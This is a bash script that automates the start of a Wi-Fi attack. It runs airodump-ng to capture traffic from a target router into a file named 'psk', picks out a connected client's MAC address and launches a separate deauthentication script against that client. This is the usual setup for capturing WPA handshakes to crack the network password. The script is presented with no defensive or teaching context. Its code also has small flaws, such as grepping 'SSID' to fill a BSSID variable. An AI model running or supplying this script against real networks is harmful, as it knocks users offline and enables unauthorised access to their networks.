#!/bin/bash

# Define the BSSID of the router (replace AA:BB:CC:DD:EE:FF with your target router's BSSID)
ROUTER_BSSID="$(cat /winston/kenel/network_settings | grep SSID | awk {'print $2'})"
CHANNEL="$(cat /winston/kenel/network_settings | grep Channel | awk {'print $2'})"
INTERFACE="$(cat /winston/kenel/network_settings | grep interface | awk {'print $2'})"
OUTPUT_FILE="psk"
echo "$ROUTER_BSSID
$CHANNEL
$INTERFACE
$OUTPUT_FILE"

# Run airodump-ng and save output to a file
sudo airodump-ng -c $CHANNEL --bssid $ROUTER_BSSID -w $OUTPUT_FILE $INTERFACE &

# Give it a few seconds to collect data
sleep 5

# Parse the output file (psk-01.csv) to find the first client MAC (excluding the router)
CLIENT_MAC=$(awk -F',' '/Station MAC/ {p=1; next} p && $1 != "" && $1 != "'$ROUTER_BSSID'" {print $1; exit}' $OUTPUT_FILE-01.csv | tr -d ' ')

# Check if a client was found
if [ -z "$CLIENT_MAC" ]; then
  echo "No clients found yet. Retrying in 5 seconds..."
  sleep 5
  CLIENT_MAC=$(awk -F',' '/Station MAC/ {p=1; next} p && $1 != "" && $1 != "'$ROUTER_BSSID'" {print $1; exit}' $OUTPUT_FILE-01.csv | tr -d ' ')
fi

# If a client is found, launch the deauth script in a new terminal
if [ ! -z "$CLIENT_MAC" ]; then
  echo "Found client: $CLIENT_MAC"
  gnome-terminal -- bash -c "./deauth.sh $CLIENT_MAC $ROUTER_BSSID $INTERFACE; exec bash"
else
  echo "No client found. Exiting."
fi
